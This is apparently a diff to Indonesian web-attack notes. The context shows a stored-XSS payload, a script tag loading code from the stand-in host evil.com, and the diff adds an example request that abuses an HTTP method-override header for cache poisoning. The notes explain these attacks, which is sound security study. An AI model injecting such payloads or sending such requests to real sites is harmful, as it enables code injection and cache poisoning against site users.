@@ -31,3 +31,15 @@
       # Response
 
         <script src="https://evil.com/app.js"></script> => Dampak : XSS Storage dan UI defacement
+
+
+3. Cache Poisoning via HTTP Method Override
+
+   # Backend mendukung override method tapi cache tidak sadar.
+
+   # Contoh
+
+      POST /api/user HTTP/1.1
+      X-HTTP-Method-Override : GET
+
+   
